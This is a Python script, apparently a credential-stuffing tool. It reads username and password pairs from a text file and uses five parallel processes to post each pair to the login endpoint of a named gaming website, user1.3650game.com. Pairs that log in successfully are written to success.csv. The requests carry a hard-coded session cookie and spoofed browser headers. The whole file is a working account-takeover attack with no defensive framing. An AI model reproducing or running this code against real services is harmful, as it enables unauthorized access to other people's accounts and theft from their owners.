#!/usr/bin/env python
# -*- coding:utf-8 -*-
"""
-------------------------------------------------
   File Name：     login_er
   Description :
   Author :        hayden_huang
   Date：          2018/12/1 14:59
-------------------------------------------------
"""

import multiprocessing
import json
import time
import requests

def read_txt():
    account_list = []
    with open('account.txt') as f:
        results = f.readlines()
        for res in results:
            try:
                name = res.split(',')[0]
                password = res.split(',')[1].strip()
                account_obj = {
                    'name': name,
                    'password': password,
                }
                account_list.append(account_obj)
            except:
                print('该行文本格式有误')
                print(res)
                with open('failed.txt', 'a') as ff:
                    ff.write(res)
    return account_list

def get_res(account_list,num):
    for account in account_list:
        name = account['name']
        password = account['password']
        print('当前进程是：' + str(num))
        print('账号：'+name+' 密码：'+password)
        try:
            headers = {
                'Accept': "text/plain, */*; q=0.01",
                'Accept-Encoding': "gzip, deflate",
                'Accept-Language': "zh-CN,zh;q=0.9",
                'Cache-Control': "no-cache",
                'Content-Length': "124",
                'Content-Type': "application/x-www-form-urlencoded; charset=UTF-8",
                'Cookie': "PHPSESSID=9kkhn3n61knenmqirkpqa52ro2; think_var=zh-cn",
                'Form-Encryptor': "true",
                'Host': "user1.3650game.com",
                'Origin': "http://user1.3650game.com",
                'Pragma': "no-cache",
                'Proxy-Connection': "keep-alive",
                'Referer': "http://user1.3650game.com/index/index/login.html",
                'User-Agent': "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36",
                'X-Requested-With': "XMLHttpRequest",
                'cache-control': "no-cache",
                'Postman-Token': "40159236-37be-491b-9547-edc181c3c18d"
            }

            url = 'http://user1.3650game.com/ajax/user/login'
            body = 's={"identityId":"'+name+'","credential":"'+password+'","captcha":"","accountType":"PERSONALITY","gotourl":"","ls":"","pid":""}'
            resposne = requests.post(url,headers=headers,data=body,timeout=10)
            json_obj = json.loads(resposne.text)
            if json_obj['errorCode'] == 0:
                print('登录成功')
                with open('success.csv','a') as f:
                    save_res = name + ',' + password + '\n'
                    f.write(save_res)
            else:
                print('登录失败')
                with open('error.csv', 'a') as f:
                    save_res = name + ',' + password + '\n'
                    f.write(save_res)
        except:
            print('未知错误')
            with open('failed.csv', 'a') as f:
                save_res = name + ',' + password + '\n'
                f.write(save_res)

if __name__ == '__main__':
    # num = input('请输入进程个数')
    num = '5'
    account_list = read_txt()
    a = int(len(account_list) / int(num))
    b = a * 2
    c = a * 3
    d = a * 4
    args = (
        (account_list[:a],1,),
        (account_list[a:b],2,),
        (account_list[b:c],3,),
        (account_list[c:d],4,),
        (account_list[d:],5,)
    )

    p = multiprocessing.Pool(int(num))
    for arg in args:
        p.apply_async(get_res, args=arg)

    p.close()
    p.join()
    print('10秒后关闭....')
    time.sleep(10)